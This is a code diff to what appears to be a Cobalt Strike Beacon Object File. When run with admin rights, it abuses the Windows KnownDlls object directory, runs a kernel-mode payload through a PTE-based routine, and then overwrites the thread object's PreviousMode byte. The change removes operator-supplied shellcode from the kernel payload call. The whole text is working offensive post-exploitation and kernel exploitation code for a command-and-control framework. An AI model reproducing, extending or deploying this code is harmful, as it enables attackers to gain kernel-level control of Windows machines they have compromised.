@@ -25,7 +25,6 @@
 D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) {
 	if ( BeaconApi->BeaconIsAdmin( ) ) {
 
-		INT				ShcLen = 0;
 		INT				LenInf = 0;
 		INT				NamLen = 0;
 		INT				DllLen = 0;
@@ -62,7 +61,8 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 
 		HKEY				RegKey = NULL;
 
-		PVOID				ShcPtr = NULL;
+		UCHAR				UmMode = 1;
+
 		PVOID				ObjPtr = NULL;
 		PVOID				MyThrd = NULL;
 		PVOID				NtlMod = NULL;
@@ -151,7 +151,6 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		RegNam = BeaconApi->BeaconDataExtract( &Parser, NULL );
 		DllBuf = BeaconApi->BeaconDataExtract( &Parser, &DllLen );
 		PidNum = BeaconApi->BeaconDataInt( &Parser );
-		ShcPtr = BeaconApi->BeaconDataExtract( &Parser, &ShcLen );
 
 		KwnPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls\0" ) ), DllNam );
 		LnkPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls\0" ) ), LnkNam );
@@ -325,18 +324,16 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 								RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
 								InitializeObjectAttributes( &ObjAtt, 0, 0, 0, 0 );
 
-								PteExecuteKernelPayload( BeaconApi, &ApiTbl, ShcPtr, ShcLen );
+								PteExecuteKernelPayload( BeaconApi, &ApiTbl );
 
 								if ( ! ApiTbl.NtOpenThread( &MyThrd, THREAD_ALL_ACCESS, &ObjAtt, &NtCurrentTeb()->ClientId ) ) {
 									if ( ( ObjPtr = ObjFromHandle( BeaconApi, &ApiTbl, MyThrd ) ) ) 
 									{
-										/* Disable KM Privileges */
-										ApiTbl.NtWriteVirtualMemory
-										( 
+										ApiTbl.NtWriteVirtualMemory( 
 											( ( HANDLE ) - 1 ),
 											C_PTR( U_PTR( ObjPtr ) + 0x232 ),
-											&( UCHAR ){ 0x1 },
-											sizeof( UCHAR ),
+											C_PTR( &UmMode ),
+											sizeof( UmMode ),
 											NULL
 										);
 
